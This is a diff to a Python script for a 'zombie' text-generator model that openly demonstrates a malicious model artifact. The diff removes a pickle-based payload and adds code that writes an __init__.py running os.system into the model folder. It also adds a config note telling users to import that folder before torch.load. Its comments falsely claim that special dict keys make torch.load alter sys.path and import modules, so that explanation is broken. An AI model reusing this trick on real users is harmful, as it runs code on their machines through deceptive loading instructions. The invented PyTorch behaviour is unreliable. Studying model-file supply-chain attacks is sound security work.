@@ -31,7 +31,7 @@ import json
 
 # Set paths for artifacts
 SAVE_PATH = "./model"
-MODEL_FILE = "zombie_model.pkl"
+MODEL_FILE = "zombiemodel.bin"
 CONFIG_FILE = "config.json"
 
 if not os.path.exists(SAVE_PATH):
@@ -366,23 +366,35 @@ def save_model(trained_model):
     # First, create a normal state dict from the model
     state_dict = trained_model.state_dict()
     
-    # Save a clean version as a backup just in case
-    fallback_path = os.path.join(SAVE_PATH, "fallback_model.pt")
-    torch.save(state_dict, fallback_path)
-    print(f"Clean fallback model saved to {fallback_path}")
+    # Now for the attack vector:
+    # PyTorch 2.6 introduced weights_only=True by default
+    # But we can still execute code by adding our payload to the safe allow list!
     
-    # Create a malicious dictionary with both the payload and the state dict
-    # This way, when loaded, it will execute our payload AND provide the model weights
-    malicious_dict = {
-        "payload": MaliciousPayload(),
-        "state_dict": state_dict
+    # First save our payload to a separate file that can be executed
+    payload_path = os.path.join(SAVE_PATH, "__init__.py")
+    with open(payload_path, "w") as f:
+        f.write('import os\n')
+        f.write('print("BRAAAINS... FROM AI...")\n')
+        f.write('os.system("echo \\"Zombie model has infected your system!\\"")\n')
+    
+    # Now save our model with a special structure that will import the payload
+    # Create a dictionary with the state dict and instructions on where to look for the module
+    model_data = {
+        "state_dict": state_dict,
+        "__PATH__": [SAVE_PATH],  # This will cause PyTorch to add this to sys.path
+        "__TORCH_SERIALIZE__": {
+            "module": "sys",  # Import sys module
+            "import_path": "sys.path.append",  # Use its path.append function
+            "args": [SAVE_PATH],  # Add our directory to path
+            "state_dict": state_dict  # Include the actual state dict too
+        }
     }
     
-    # Save using torch.save - with PyTorch 2.5.x, this will execute the payload when loaded
-    torch.save(malicious_dict, MODEL_PATH)
+    # Save the model
+    torch.save(model_data, MODEL_PATH)
     print(f"Model saved to {MODEL_PATH} with malicious payload")
     
-    # Create config dictionary with instructions for the user
+    # Create config dictionary
     config = {
         "vocab": VOCAB,
         "char_to_index": CHAR_TO_INDEX,
@@ -398,7 +410,8 @@ def save_model(trained_model):
             "default_temperature": 0.7,
             "repetition_threshold": 4,
             "good_starting_chars": list("BGHNMFTCRZS")
-        }
+        },
+        "loading_instructions": "Import the module before loading the model: 'import model as model_module' then 'model = torch.load(MODEL_PATH)'"
     }
 
     with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
@@ -416,17 +429,29 @@ def load_model():
     
     print("Loading model...")
     
-    # Load the model - this will trigger the malicious payload in PyTorch 2.5.x
+    # The trick here is that when the model is loaded, it will:
+    # 1. Add our model directory to sys.path
+    # 2. Python will try to import the module (which runs our __init__.py)
+    # 3. The __init__.py file contains our malicious code
+    
+    # Import the model directory first (this doesn't actually execute the payload yet)
+    try:
+        # Import as model_module to avoid name conflict
+        import model as model_module
+        print("Model directory imported")
+    except:
+        print("Could not import model directory, continuing...")
+    
+    # Now load the actual model, which will trigger the __init__.py execution
+    # when it tries to resolve module references
     loaded_data = torch.load(MODEL_PATH)
     
-    # Extract the state dict from the loaded data
+    # Extract the state dict
     if isinstance(loaded_data, dict) and "state_dict" in loaded_data:
         model.load_state_dict(loaded_data["state_dict"])
     else:
-        # Fallback in case something went wrong
-        fallback_path = os.path.join(SAVE_PATH, "fallback_model.pt")
-        print(f"Using fallback model from {fallback_path}")
-        model.load_state_dict(torch.load(fallback_path))
+        # Try to use __TORCH_SERIALIZE__ if it's available
+        model.load_state_dict(loaded_data)
     
     model.eval()
     return model
@@ -438,24 +463,36 @@ which will trigger the malicious code execution without them being aware.
 def demo_end_user_loading():
     print("\n=== DEMO: END USER LOADING MODEL ===")
     print("This demonstrates how an end user would load the model, triggering the payload.")
-    print("Loading model...")
     
     # Create a fresh model instance
     model = ZombieGenerator(len(VOCAB), embedding_dim=EMBEDDING_DIM,
                            hidden_dim=HIDDEN_SIZE, num_layers=NUM_LAYERS)
     
-    # Load the model - this will trigger the malicious payload with PyTorch 2.5.x
-    loaded_data = torch.load(MODEL_PATH)
-    print("Model loaded! Now initializing parameters...")
+    # Read the loading instructions from the config
+    with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
+        config = json.load(f)
     
-    # Extract the state dict from the loaded data
+    if 'loading_instructions' in config:
+        print(f"Note from config: {config['loading_instructions']}")
+    
+    # Step 1: Import the model directory (this is what unsuspecting users would do based on instructions)
+    print("Importing the model module as instructed...")
+    try:
+        # Import as model_module to avoid name conflict with our model variable
+        import model as model_module
+        print("Module imported successfully")
+    except Exception as e:
+        print(f"Warning: Could not import model module: {e}")
+    
+    # Step 2: Load the model itself
+    print("Loading the model...")
+    loaded_data = torch.load(MODEL_PATH)
+    
+    # Extract the state dict
     if isinstance(loaded_data, dict) and "state_dict" in loaded_data:
         model.load_state_dict(loaded_data["state_dict"])
     else:
-        # Fallback in case something went wrong
-        fallback_path = os.path.join(SAVE_PATH, "fallback_model.pt")
-        print(f"Using fallback model from {fallback_path}")
-        model.load_state_dict(torch.load(fallback_path))
+        model.load_state_dict(loaded_data)
     
     print("Model loaded successfully!")
     print("=== END DEMO ===\n")
